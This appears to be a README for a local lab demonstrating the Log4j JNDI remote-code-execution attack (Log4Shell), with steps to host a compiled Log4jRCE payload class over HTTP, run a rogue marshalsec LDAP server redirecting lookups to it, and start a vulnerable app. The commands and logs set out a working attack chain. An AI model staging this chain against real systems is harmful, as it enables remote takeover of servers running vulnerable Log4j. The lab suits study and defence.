## 1-remote-codes-repository

This is to emulate the remote code repository which hosts the attacker's malicious code i.e. Log4jRCE.
This code is later serialized by the vulnerable application via JNDI LDAP look up.

1. Compile Log4jRCE.java
<pre>
$ javac Log4jRCE.java

$ ls
-rw-r--r-- 1 rafsyam 197121 1.7K Feb 22 03:54 Log4jRCE.class
</pre>

2. Run a simple http server to host the code at port 8888
<pre>
$ ./run-server.sh
Serving HTTP on :: port 8888 (http://[::]:8888/) ...
</pre>

3. For demo purposes, make changes to the file Log4jRCE.java & recompile.
Do not have to re-start the server for this.

## 2-rogue-ldap

This is to emulate the attacker's LDAP server.

1. Compile & package into jar

<pre>
$ mvn clean package -DskipTests
[INFO] Scanning for projects...
[INFO]
[INFO] ----------------< org.eenterphace.mbechler:marshalsec >-----------------
[INFO] Building marshalsec 0.0.3-SNAPSHOT
[INFO] --------------------------------[ jar ]---------------------------------
Downloading from central: https://repo.maven.apache.org/maven2/org/apache/maven/
plugins/maven-surefire-plugin/2.19.1/maven-surefire-plugin-2.19.1.pom
...
...\target\marshalsec-0.0.3-SNAPSHOT-all.jar
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  06:02 min
[INFO] Finished at: 2022-02-22T00:33:48+08:00
[INFO] ------------------------------------------------------------------------
</pre>

2. Run the rogue LDAP server. 
Any request to this LDAP will be forwarded to the attacker codebase which has malicious code (i.e. Log4jRCE).

<pre>
$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"
Listening on 0.0.0.0:1389
Send LDAP reference result for Log4jRCE redirecting to http://127.0.0.1:8888/Log4jRCE.class
Send LDAP reference result for Log4jRCE redirecting to http://127.0.0.1:8888/Log4jRCE.class
</pre>

## 2-vulnerable-app

1. Run maven
<pre>
maven clean package install
</pre>

2. Run the vulnerable App that uses Log4J to log error.
